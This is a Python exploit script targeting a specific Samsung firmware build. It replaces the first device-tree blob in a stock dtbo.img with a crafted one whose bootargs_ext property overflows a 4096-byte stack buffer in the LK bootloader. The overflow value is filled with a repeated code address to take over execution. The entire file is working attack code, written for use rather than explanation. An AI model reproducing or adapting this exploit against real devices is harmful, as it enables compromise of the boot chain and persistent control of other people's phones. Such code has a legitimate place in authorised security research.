"""Craft a DTBO whose /chosen/bootargs_ext overflows the LK's 4096-byte
stack buffer in FUN_f482f4c4 (only `len >= 0` is checked).

S926BXXUIEZJB, s5e9945.  Stock dtbo.img is 8 MB with 7 FDTs; entry 0 is
{size=0x51d64, offset=0x100} (big-endian), so we replace the whole FDT at
0x100 with a minimal one carrying a long bootargs_ext.

Usage: python make_dtbo.py <stock dtbo.img> <out dtbo.img> [len]
"""
import struct
import sys

PTR = 0x000000000896010100          # CODE_ADDR from offsets.py


def fdt(n):
    """Minimal valid FDT: root -> chosen -> bootargs_ext of length n."""
    name = b"bootargs_ext"
    val = struct.pack("<Q", PTR) * (n // 8)

    # struct block
    def pad4(b):
        return b + b"\0" * (-len(b) % 4)

    st = b""
    st += struct.pack(">I", 1) + pad4(b"root")                   # BEGIN_NODE root
    st += struct.pack(">I", 1) + pad4(b"chosen")                 # BEGIN_NODE chosen
    st += struct.pack(">III", 3, len(val), 0) + pad4(val)        # PROP bootargs_ext
    st += struct.pack(">I", 2)                                    # END_NODE chosen
    st += struct.pack(">I", 2)                                    # END_NODE root
    st += struct.pack(">I", 9)                                    # FDT_END

    strings = name + b"\0"
    rsv = b"\0" * 16

    hdr_len = 0x28
    off_rsv = hdr_len
    off_st = off_rsv + len(rsv)
    off_str = off_st + len(st)
    total = off_str + len(strings)

    hdr = struct.pack(
        ">10I",
        0xD00DFEED, total, off_st, off_str, off_rsv,
        17, 16, 0, len(strings), len(st),
    )
    blob = hdr + rsv + st + strings
    assert len(blob) == total, (len(blob), total)
    return blob


def main():
    src, dst = sys.argv[1], sys.argv[2]
    n = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x3000
    n -= n % 8
    data = bytearray(open(src, "rb").read())

    magic = struct.unpack_from("<I", data, 0)[0]
    assert magic == 0x1EABB7D7, hex(magic)
    total, hdr, esz, ecnt, eoff, page = struct.unpack_from(">6I", data, 4)
    assert hdr == 0x20 and eoff == 0x20, (hdr, eoff)

    e0 = 0x20
    size0, off0 = struct.unpack_from(">2I", data, e0)
    print(f"entry0: size={size0:#x} offset={off0:#x}")

    blob = fdt(n)
    print(f"crafted FDT: {len(blob):#x} bytes, bootargs_ext len={n:#x}")
    assert len(blob) <= size0, "new FDT must fit where the old one was"

    data[off0:off0 + len(blob)] = blob
    data[off0 + len(blob):off0 + size0] = b"\0" * (size0 - len(blob))
    struct.pack_into(">I", data, e0, len(blob))     # shrink entry0 to match

    open(dst, "wb").write(data)
    print(f"wrote {dst} ({len(data):#x} bytes)")

    # self-check
    m = struct.unpack_from(">I", data, off0)[0]
    t = struct.unpack_from(">I", data, off0 + 4)[0]
    print(f"self-check: FDT magic={m:#x} totalsize={t:#x}")


if __name__ == "__main__":
    main()
